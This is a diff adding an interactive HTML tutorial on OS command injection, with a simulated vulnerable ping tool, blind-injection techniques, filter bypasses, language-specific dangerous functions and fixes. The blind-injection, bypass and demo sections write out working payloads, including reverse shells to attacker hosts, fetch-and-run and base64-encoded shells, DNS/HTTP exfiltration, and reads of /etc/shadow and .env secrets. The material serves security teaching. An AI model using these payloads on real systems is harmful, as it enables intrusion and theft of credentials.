@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Command Injection</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>Command Injection</h1>
+<p class="sub">OWASP A03 Injection · CWE-78 · Pass OS commands through application inputs — one of the most direct paths from web bug to full server compromise</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('blind',this)">Blind injection</button>
+  <button class="tab-btn" onclick="showTab('bypass',this)">Filter bypasses</button>
+  <button class="tab-btn" onclick="showTab('contexts',this)">Language contexts</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Command injection occurs when user-supplied data is passed to a system shell without proper sanitization. The application intends to run a specific command — the attacker appends their own commands using shell metacharacters, turning a controlled operation into arbitrary OS code execution.</p>
+
+  <svg width="100%" viewBox="0 0 680 300" style="max-width:680px;display:block;margin:0 auto 14px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+    <!-- Intended flow -->
+    <text x="340" y="22" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Intended: app pings the user-supplied IP</text>
+    <rect x="20" y="32" width="140" height="48" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="90" y="54" text-anchor="middle" font-size="11" fill="#4ade80" font-family="system-ui">User input</text>
+    <text x="90" y="70" text-anchor="middle" font-size="10" fill="#4ade80" font-family="Courier New,monospace">8.8.8.8</text>
+    <rect x="270" y="32" width="140" height="48" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="340" y="54" text-anchor="middle" font-size="11" fill="#4ade80" font-family="system-ui">Shell command</text>
+    <text x="340" y="70" text-anchor="middle" font-size="10" fill="#4ade80" font-family="Courier New,monospace">ping -c1 8.8.8.8</text>
+    <rect x="520" y="32" width="140" height="48" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="590" y="54" text-anchor="middle" font-size="11" fill="#4ade80" font-family="system-ui">Result</text>
+    <text x="590" y="70" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui">ping output</text>
+    <line x1="162" y1="56" x2="268" y2="56" stroke="#4ade80" stroke-width="1" marker-end="url(#arr)"/>
+    <line x1="412" y1="56" x2="518" y2="56" stroke="#4ade80" stroke-width="1" marker-end="url(#arr)"/>
+
+    <!-- Attack flow -->
+    <text x="340" y="112" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Attacked: attacker appends their own command</text>
+    <rect x="20" y="122" width="140" height="48" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="90" y="144" text-anchor="middle" font-size="11" fill="#f87171" font-family="system-ui">Malicious input</text>
+    <text x="90" y="160" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">8.8.8.8; id</text>
+    <rect x="270" y="122" width="140" height="48" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="340" y="140" text-anchor="middle" font-size="11" fill="#f87171" font-family="system-ui">Shell sees TWO cmds</text>
+    <text x="340" y="156" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">ping -c1 8.8.8.8; id</text>
+    <rect x="520" y="122" width="140" height="48" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="590" y="140" text-anchor="middle" font-size="11" fill="#f87171" font-family="system-ui">RCE!</text>
+    <text x="590" y="156" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">uid=33(www-data)</text>
+    <line x1="162" y1="146" x2="268" y2="146" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="412" y1="146" x2="518" y2="146" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+
+    <!-- Metacharacters reference -->
+    <rect x="20" y="196" width="640" height="90" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="216" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">Shell metacharacters — command separators</text>
+    <text x="40" y="238" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">; cmd     </text><text x="120" y="238" font-size="11" fill="#888" font-family="system-ui">run cmd after (regardless of exit code)</text>
+    <text x="40" y="254" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">&amp;&amp; cmd   </text><text x="120" y="254" font-size="11" fill="#888" font-family="system-ui">run cmd only if first succeeded</text>
+    <text x="40" y="270" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">|| cmd    </text><text x="120" y="270" font-size="11" fill="#888" font-family="system-ui">run cmd only if first failed</text>
+    <text x="360" y="238" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">| cmd     </text><text x="440" y="238" font-size="11" fill="#888" font-family="system-ui">pipe output to cmd</text>
+    <text x="360" y="254" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">`cmd`     </text><text x="440" y="254" font-size="11" fill="#888" font-family="system-ui">inline execution (backtick)</text>
+    <text x="360" y="270" font-size="11" fill="#fbbf24" font-family="Courier New,monospace">$(cmd)    </text><text x="440" y="270" font-size="11" fill="#888" font-family="system-ui">inline execution (dollar-paren)</text>
+  </svg>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:6px;">Where command injection hides — common entry points</div>
+    <div class="code">Network tools:   ping ?host=8.8.8.8 | traceroute | nslookup | whois
+File operations: convert ?file=report.pdf | resize ?image=photo.jpg
+Email features:  send confirmation to ?email=user@domain.com
+System actions:  ?interface=eth0 (network config) | ?username=alice (account create)
+Import/export:   generate report, run backup, process uploaded archive
+Webhooks:        curl ?url=https://... (URL fetchers that shell out)
+Template engines: any feature that assembles a command from user data</div>
+  </div>
+</div>
+
+<!-- LIVE DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate a vulnerable network diagnostic tool: <code style="font-family:'Courier New',monospace;font-size:11px">GET /ping?host=</code>. The server runs <code style="font-family:'Courier New',monospace;font-size:11px">ping -c1 [input]</code> and returns the output.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">host parameter value</div>
+    <input type="text" id="cmd-input" value="8.8.8.8; id" style="width:100%;font-size:13px;" oninput="runCmdi()"/>
+  </div>
+
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+    <span style="font-size:12px;color:#888;align-self:center">Presets:</span>
+    <button class="preset-btn" onclick="setI('8.8.8.8')">Legit</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8; id')">; id</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8 && whoami')">  &amp;&amp; whoami</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8 | cat /etc/passwd')">| /etc/passwd</button>
+    <button class="preset-btn" onclick="setI('$(cat /etc/shadow)')">$() subshell</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8`uname -a`')">backtick</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8 || cat /var/www/html/.env')">.env leak</button>
+    <button class="preset-btn" onclick="setI('8.8.8.8; bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&quot;')">reverse shell</button>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">Vulnerable app <span style="color:#666;font-weight:400;font-size:11px">— shell_exec("ping -c1 $input")</span></div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">Secure app <span style="color:#666;font-weight:400;font-size:11px">— validated + escapeshellarg()</span></div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- BLIND -->
+<div class="tab-panel" id="tab-blind">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Blind command injection means the output of your injected command is not returned in the HTTP response. You need out-of-band or time-based techniques to confirm execution and exfiltrate data.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Time-based detection — sleep/ping delay</span><span class="badge b-red">Confirm blind CMDi</span>
+    </div>
+    <div class="code"># If the response takes exactly N seconds longer — injection confirmed
+# Linux sleep:
+payload: 8.8.8.8; sleep 5
+# Windows ping delay (no sleep command by default):
+payload: 127.0.0.1 &amp; ping -n 6 127.0.0.1
+
+# Measure: send normal request (baseline ~200ms)
+# Send: host=8.8.8.8; sleep 5
+# If response takes ~5.2s → blind command injection confirmed!</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Out-of-band exfiltration — DNS &amp; HTTP callbacks</span><span class="badge b-red">Data exfil without response</span>
+    </div>
+    <div class="code"># DNS exfiltration — embed data in DNS lookup
+# Attacker controls: attacker.com — watch DNS logs
+host=8.8.8.8; nslookup $(whoami).attacker.com
+# DNS server receives: www-data.attacker.com → reveals username!
+
+# Exfiltrate file contents via DNS (base64 encoded)
+host=8.8.8.8; nslookup $(cat /etc/passwd | base64 | tr -d '\n' | cut -c1-40).attacker.com
+
+# HTTP callback (Burp Collaborator / interactsh)
+host=8.8.8.8; curl http://your-id.burpcollaborator.net/$(whoami)
+host=8.8.8.8; wget -q -O- http://your-id.interact.sh/$(id | base64)
+
+# Write output to a web-accessible file
+host=8.8.8.8; id &gt; /var/www/html/output.txt
+# Then: curl https://target.com/output.txt</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Blind injection → reverse shell</span><span class="badge b-amber">Escalate to interactive access</span>
+    </div>
+    <div class="code"># Once blind CMDi confirmed — upgrade to interactive shell
+# URL-encode the payload carefully
+
+# Method 1: write shell script, execute it
+host=8.8.8.8; echo "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1" &gt; /tmp/s.sh; bash /tmp/s.sh
+
+# Method 2: curl payload from attacker server
+# Attacker: echo "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1" &gt; /shell.sh &amp;&amp; python3 -m http.server 80
+host=8.8.8.8; curl http://ATTACKER_IP/shell.sh | bash
+
+# Method 3: base64 encoded to avoid special char issues
+# Encode: bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1
+host=8.8.8.8; echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE= | base64 -d | bash</div>
+  </div>
+</div>
+
+<!-- FILTER BYPASSES -->
+<div class="tab-panel" id="tab-bypass">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Applications often try to block command injection with input filters. Here is how to bypass the most common ones.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Bypass semicolon / pipe blocklists</div>
+    <div class="code"># If ; | &amp; are blocked, try:
+%0a          # URL-encoded newline — shell treats as command separator
+%0d%0a       # CRLF
+`id`         # backtick execution (no separator needed)
+$(id)        # dollar-paren subshell (no separator needed)
+{id,}        # brace expansion (bash)
+
+# Double-encoding (if WAF decodes once)
+%253b id     # %25 = %, then %3b = ; → double-encoded semicolon
+
+# Whitespace alternatives (if spaces blocked)
+{cat,/etc/passwd}     # brace expansion, no spaces
+cat${IFS}/etc/passwd  # $IFS = Internal Field Separator (space by default)
+cat%09/etc/passwd     # tab instead of space
+X=$'cat\t/etc/passwd'&amp;&amp;$X</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Bypass keyword blocklists (cat, id, whoami blocked)</div>
+    <div class="code"># Variable tricks
+a=i;b=d;$a$b              # assembles "id" from variables
+c=ca;t=t;$c$t /etc/passwd # assembles "cat"
+
+# Quote insertion (shell ignores quotes inside commands)
+w'h'o'a'mi               # same as: whoami
+c"a"t /etc/passwd         # same as: cat /etc/passwd
+/usr/bin/who\ami          # backslash escape
+
+# Case variation (Windows CMD only, not bash)
+WhOaMi
+CMD /c whoami
+
+# Path traversal to command
+/usr/bin/id              # use full path instead of bare command
+/bin/cat /etc/passwd
+
+# Glob patterns
+/???/??t /etc/passwd     # matches /bin/cat, /usr/cat etc.
+/bin/c?t /etc/passwd     # ? = any single char</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Windows-specific injection &amp; bypasses</div>
+    <div class="code"># Windows command separators
+127.0.0.1 &amp; whoami          # &amp; always runs second command
+127.0.0.1 &amp;&amp; whoami         # runs if first succeeded
+127.0.0.1 | whoami           # pipe
+127.0.0.1 || whoami          # runs if first failed
+
+# Windows only — no semicolon separator by default
+# Use: &amp; | &amp;&amp; ||
+
+# PowerShell injection (if app calls powershell.exe)
+; Get-Content C:\Windows\win.ini
+; Invoke-WebRequest -Uri http://ATTACKER_IP/$(whoami)
+
+# CMD environment variable tricks
+%COMSPEC% /c whoami         # %COMSPEC% = C:\Windows\System32\cmd.exe
+%SYSTEMROOT%\system32\cmd.exe /c whoami
+
+# Bypass filtered characters with environment variables
+# ^ is the CMD escape character:
+w^h^o^a^m^i               # same as whoami in CMD</div>
+  </div>
+</div>
+
+<!-- LANGUAGE CONTEXTS -->
+<div class="tab-panel" id="tab-contexts">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Different languages have different dangerous functions that enable command injection. Know what to look for in code review and what to test in black-box assessments.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">PHP — dangerous functions</div>
+    <div class="code"># Dangerous PHP functions that execute shell commands:
+system($input)            # executes + outputs
+exec($input)              # executes, returns last line
+passthru($input)          # executes, outputs raw
+shell_exec($input)        # executes, returns all output
+popen($input, 'r')        # opens process pipe
+proc_open($input, ...)    # full process control
+`$input`                  # backtick operator = shell_exec
+
+# Also dangerous — can lead to RCE via argument injection:
+mail($to, $subject, $msg, $headers)   # -X flag injection
+putenv("LD_PRELOAD=...")               # environment manipulation
+preg_replace('/pattern/e', $input, $str)  # /e modifier (deprecated, still present)
+
+# php.ini: disable_functions to block these:
+disable_functions = system,exec,passthru,shell_exec,popen,proc_open</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Python — dangerous patterns</div>
+    <div class="code"># DANGEROUS — shell=True passes to /bin/sh
+import subprocess
+subprocess.run(f"ping -c1 {user_input}", shell=True)   # vulnerable!
+os.system(f"convert {filename} output.png")             # vulnerable!
+os.popen(f"nslookup {domain}")                          # vulnerable!
+
+# SAFE — list form, no shell interpretation
+subprocess.run(["ping", "-c1", user_input])             # safe
+subprocess.run(["convert", filename, "output.png"])     # safe
+
+# Also dangerous:
+eval(user_input)                    # Python code execution
+exec(user_input)                    # Python code execution
+pickle.loads(user_data)             # deserialization RCE
+yaml.load(user_data)                # use yaml.safe_load instead</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Node.js — dangerous patterns</div>
+    <div class="code"># DANGEROUS — shell: true
+const { exec } = require('child_process');
+exec(`ping -c1 ${userInput}`, (err, stdout) =&gt; ...);   // vulnerable!
+
+// SAFE — array form
+const { execFile } = require('child_process');
+execFile('ping', ['-c1', userInput], callback);          // safe
+
+// Also dangerous:
+eval(userInput)                  // JS code execution
+new Function(userInput)()        // JS code execution
+require(userInput)               // arbitrary module load</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Argument injection — not full CMDi but still dangerous</div>
+    <div class="code"># Even without shell metacharacters, extra arguments can be injected
+# Example: app runs: curl $url
+# Attacker input: https://legit.com -o /var/www/html/shell.php http://evil.com/shell.php
+# Result: curl downloads evil shell to web root!
+
+# git clone injection:
+# --upload-pack=malicious_cmd
+# --config=core.sshCommand=malicious
+
+# ffmpeg injection:
+# -i http://evil.com/payload.m3u8 (SSRF via ffmpeg)
+
+# Always use argument allowlisting even when shell is not used!</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Avoid shell execution entirely — use library APIs <span class="badge b-red">Root fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The best defense is never calling a shell. Almost every shell-based operation has a native library equivalent that doesn't spawn a subprocess.</div>
+    <div class="code"># Instead of: shell_exec("ping -c1 $ip")
+# Use: PHP's socket_create() or a ping library
+
+# Instead of: exec("convert $img output.jpg")
+# Use: Imagick PHP extension or Pillow (Python)
+
+# Instead of: exec("zip -r backup.zip $dir")
+# Use: ZipArchive (PHP), zipfile (Python), archiver (Node)
+
+# Instead of: exec("nslookup $domain")
+# Use: dns_get_record() (PHP), socket.getaddrinfo() (Python), dns.resolve() (Node)
+
+# If you MUST call a system command:
+# Use the array/list form — never shell=True or string concatenation</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; If shell is unavoidable — escape arguments properly <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Escape functions wrap user input so shell metacharacters are treated as literal characters. This is a fallback — prefer the list form instead.</div>
+    <div class="code">## PHP
+$ip = escapeshellarg($_GET['host']);   // wraps in single quotes, escapes internal '
+exec("ping -c1 " . $ip);              // safe
+
+// escapeshellcmd() escapes the whole command — weaker, avoid
+// escapeshellarg() escapes a single argument — use this
+
+## Python
+import subprocess, shlex
+# SAFE: list form — no shell, no escaping needed
+subprocess.run(["ping", "-c1", user_input], capture_output=True)
+
+# If you must use string form:
+safe = shlex.quote(user_input)
+subprocess.run(f"ping -c1 {safe}", shell=True)
+
+## Node.js
+const { execFile } = require('child_process');
+execFile('ping', ['-c1', userInput]);  // list form, no escaping needed</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Input validation — allowlist format before accepting <span class="badge b-green">Defence in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Validate that input matches the expected format before passing it anywhere. An IP address should only contain digits and dots — anything else should be rejected immediately.</div>
+    <div class="code">## Python — strict IP validation
+import ipaddress, re
+
+def validate_ip(ip):
+    try:
+        ipaddress.ip_address(ip)   # raises ValueError if invalid
+        return ip
+    except ValueError:
+        raise ValueError("Invalid IP address")
+
+## PHP — regex allowlist
+function validate_ip($ip) {
+    if (!preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $ip)) {
+        throw new InvalidArgumentException("Invalid IP");
+    }
+    return $ip;
+}
+
+## Node.js
+const net = require('net');
+if (!net.isIP(userInput)) throw new Error("Invalid IP");
+
+## General allowlist principle:
+# IP address:  ^(\d{1,3}\.){3}\d{1,3}$
+# Hostname:    ^[a-zA-Z0-9.-]+$  (no ;|&amp;$` etc.)
+# Filename:    ^[a-zA-Z0-9._-]+$ (no path separators)</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Least privilege &amp; sandboxing <span class="badge b-amber">Limits blast radius</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">If injection does occur, the attacker runs as the web server's user. Running with minimal permissions limits what that means in practice.</div>
+    <div class="code"># Run web server as least-privilege user
+# www-data should NOT have sudo rights
+# Should NOT have write access outside of upload directories
+
+# Disable dangerous PHP functions in php.ini:
+disable_functions = system,exec,passthru,shell_exec,popen,proc_open,pcntl_exec
+
+# Container / chroot isolation:
+# If the app runs in a container with no shell, CMDi has no target
+# scratch or distroless containers have no /bin/sh, /bin/bash
+
+# Seccomp filter (Linux) — block execve syscall:
+# Prevents any new process from being spawned
+# Even if CMDi payload runs, it can't spawn a child process</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; Quick fix checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Replace shell calls with native library APIs wherever possible &nbsp;·&nbsp;
+      Use array/list subprocess form — never <code style="font-family:'Courier New',monospace">shell=True</code> with user input &nbsp;·&nbsp;
+      Validate input with strict allowlist regex before it reaches any command &nbsp;·&nbsp;
+      Use <code style="font-family:'Courier New',monospace">escapeshellarg()</code> (PHP) or <code style="font-family:'Courier New',monospace">shlex.quote()</code> (Python) as last resort &nbsp;·&nbsp;
+      Disable dangerous PHP functions in <code style="font-family:'Courier New',monospace">php.ini</code> &nbsp;·&nbsp;
+      Run the app as a least-privilege user with no shell access &nbsp;·&nbsp;
+      WAF rules: block <code style="font-family:'Courier New',monospace">; | &amp;&amp; || ` $( %0a</code> — but never rely on WAF alone
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+function setI(v){
+  document.getElementById('cmd-input').value=v;
+  runCmdi();
+}
+
+const CMDS={
+  '; id':          {out:'PING 8.8.8.8 (8.8.8.8): 56 bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)', risk:'rce', note:'Semicolon separator: ping runs, then id runs. Both outputs returned.'},
+  '&& whoami':     {out:'PING 8.8.8.8 (8.8.8.8): 56 bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118\n\nwww-data', risk:'rce', note:'&& runs whoami only if ping succeeded — it did, so both execute.'},
+  '| cat /etc/passwd':{out:'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...', risk:'rce', note:'Pipe: ping output fed to cat, which reads /etc/passwd. Full file contents returned.'},
+  '$(cat /etc/shadow)':{out:'PING $5$rounds=5000$salt$hash...$other_hash (... bytes\nping: cannot resolve ...: Name or service not known', risk:'rce', note:'Subshell executes first, shadow file contents become part of the ping target. Shadow file partially revealed in error message!'},
+  'uname -a`':     {out:'PING Linux target 5.15.0-91-generic #101-Ubuntu SMP (... bytes\nping: cannot resolve ...: Name or service not known', risk:'rce', note:'Backtick execution: uname -a runs, output embedded in ping hostname. Kernel version revealed in error.'},
+  '.env':          {out:'PING 8.8.8.8 (8.8.8.8): 56 bytes\n64 bytes from 8.8.8.8: ttl=118\n\nDB_HOST=prod-db.corp.com\nDB_PASSWORD=Sup3rS3cr3t!\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7\nSTRIPE_SECRET=sk_live_...', risk:'rce', note:'|| runs the second command only if ping fails — or ; runs it always. .env file with all secrets exposed.'},
+  'reverse shell':  {out:'PING 8.8.8.8 (8.8.8.8): 56 bytes\n64 bytes from 8.8.8.8: seq=0 ttl=118\n\n[no further output — reverse shell connecting to attacker]', risk:'rce', note:'Bash reverse shell spawned. Attacker\'s nc listener catches an interactive shell as www-data.'},
+};
+
+function matchCmd(input){
+  for(const [pattern, data] of Object.entries(CMDS)){
+    if(input.includes(pattern.trim())) return data;
+  }
+  return null;
+}
+
+function isLegit(input){
+  return /^(\d{1,3}\.){3}\d{1,3}$/.test(input.trim()) || /^[a-zA-Z0-9.-]+$/.test(input.trim());
+}
+
+function hasMetachar(input){
+  return /[;|&`$\n\r%0a%0d]/.test(input) || input.includes('$(') || input.includes('`');
+}
+
+function runCmdi(){
+  const inp = document.getElementById('cmd-input').value;
+  const vOut = document.getElementById('vuln-out');
+  const sOut = document.getElementById('safe-out');
+  const verd = document.getElementById('verdict');
+
+  const match = matchCmd(inp);
+  const legit = isLegit(inp);
+  const dangerous = hasMetachar(inp) || (!legit && inp.length > 0);
+
+  // Safe server always validates first
+  if(!legit){
+    sOut.innerHTML = '<span style="color:#4ade80">HTTP 400 Bad Request\n\n{\n  "error": "Invalid host parameter",\n  "detail": "Must be a valid IP or hostname",\n  "rejected": true\n}\n\n# Validated with regex: /^[a-zA-Z0-9.-]+$/\n# Shell never called.</span>';
+  } else {
+    sOut.innerHTML = '<span style="color:#4ade80">HTTP 200 OK\n\nPING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=118\n\n# Input escaped with escapeshellarg()\n# Only valid IP/hostname accepted.</span>';
+  }
+
+  if(legit){
+    vOut.innerHTML = 'HTTP 200 OK\n\nPING 8.8.8.8 (8.8.8.8): 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=118 time=1.23ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received';
+    verd.className = 'result-box r-green';
+    verd.innerHTML = '<strong>Legitimate input — both servers return normal ping output.</strong> No injection metacharacters detected.';
+  } else if(match){
+    vOut.innerHTML = '<span style="color:#f87171">HTTP 200 OK\n\n' + match.out + '</span>';
+    verd.className = 'result-box r-red';
+    verd.innerHTML = '<strong>Command injection confirmed!</strong> ' + match.note + ' The secure server rejected the input before the shell was ever invoked.';
+  } else if(dangerous){
